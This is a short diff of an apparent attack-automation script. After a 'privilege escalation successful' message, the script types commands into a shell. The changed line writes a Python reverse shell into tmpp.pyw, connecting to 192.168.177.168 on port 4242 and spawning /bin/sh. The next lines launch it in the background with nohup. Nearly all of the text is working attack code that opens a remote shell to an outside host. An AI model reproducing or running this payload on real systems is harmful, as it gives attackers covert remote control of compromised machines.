@@ -242,6 +242,6 @@ line()
 print("Privlege escallation succesful!")
 sleep(2)
 
-typewrite("echo \"import socket,os,pty;ip=\'192.168.177.204\';port=4242;binsh=\'/bin/sh\';s=socket.socket();s.connect((ip,port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(binsh)\" > tmpp.pyw\n")
+typewrite("echo \"import socket,os,pty;ip=\'192.168.177.168\';port=4242;binsh=\'/bin/sh\';s=socket.socket();s.connect((ip,port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(binsh)\" > tmpp.pyw\n")
 typewrite("nohup python3 tmpp.pyw & \n")
 typewrite("exit\n")
